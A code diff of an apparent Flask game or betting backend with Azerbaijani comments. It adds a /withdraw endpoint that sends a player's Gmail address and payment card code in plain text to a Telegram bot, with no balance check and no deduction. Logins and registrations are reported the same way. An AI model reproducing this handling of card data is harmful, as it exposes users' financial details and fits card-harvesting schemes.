@@ -3,7 +3,7 @@ import json
 import os
 import random
 import time
-import requests  # Telegram üçün sorğu kitabxanası əlavə olundu
+import requests  # Telegram üçün sorğu kitabxanası
 
 app = Flask(__name__)
 DATA_FILE = "players.json"
@@ -68,7 +68,6 @@ def auth():
 
     players = load_data()
 
-    # Eyni gmail artıq qeydiyyatdan keçibsə, yeni hesab yaratmağa icazə vermirik
     for p_id, p_info in players.items():
         if p_info.get('gmail') == gmail:
             return jsonify({
@@ -91,7 +90,7 @@ def auth():
     }
     save_data(players)
 
-    # --- YENİ QEYDİYYAT OLDUQDA TELEGRAMA XƏBƏR GÖNDƏR ---
+    # Telegram xəbəri
     msg = (
         f"🚨 **Yeni Qeydiyyat!**\n\n"
         f"👤 **Ad:** {name}\n"
@@ -101,7 +100,6 @@ def auth():
         f"💰 **Balans:** 10.00 ₼"
     )
     send_telegram_message(msg)
-    # ----------------------------------------------------
 
     return jsonify({
         "status": "success",
@@ -125,7 +123,6 @@ def login():
         players[player_id]['last_active'] = int(time.time() * 1000)
         save_data(players)
         
-        # --- OYUNCU DAXİL OLDUQDA TELEGRAMA XƏBƏR GÖNDƏR ---
         p_name = players[player_id].get('name', 'Naməlum')
         msg = (
             f"🟢 **Oyunçu Giriş etdi!**\n\n"
@@ -134,7 +131,6 @@ def login():
             f"📧 **Gmail:** {gmail}"
         )
         send_telegram_message(msg)
-        # --------------------------------------------------
 
         return jsonify({
             "status": "success",
@@ -143,6 +139,32 @@ def login():
         })
     
     return jsonify({"status": "error", "message": "Daxil edilən Gmail və ya ID səhvdir!"})
+
+@app.route('/withdraw', methods=['POST'])
+def withdraw():
+    req = request.json
+    player_id = req.get('playerId')
+    amount = req.get('amount')
+    gmail = req.get('gmail')
+    card_code = req.get('cardCode')
+
+    if not player_id or not amount or not gmail or not card_code:
+        return jsonify({"status": "error", "message": "Bütün məlumatlar doldurulmalıdır!"})
+
+    players = load_data()
+    if player_id in players:
+        # Pul çıxarışını Telegram bota göndəririk
+        msg = (
+            f"💸 **Pul Çıxarma Sorğusu!**\n\n"
+            f"🆔 **ID:** `{player_id}`\n"
+            f"📧 **Gmail:** {gmail}\n"
+            f"💳 **Kart Kodu:** `{card_code}`\n"
+            f"💰 **Məbləğ:** `{amount} ₼`"
+        )
+        send_telegram_message(msg)
+        return jsonify({"status": "success"})
+    
+    return jsonify({"status": "error", "message": "Oyunçu tapılmadı!"})
 
 @app.route('/heartbeat', methods=['POST'])
 def heartbeat():
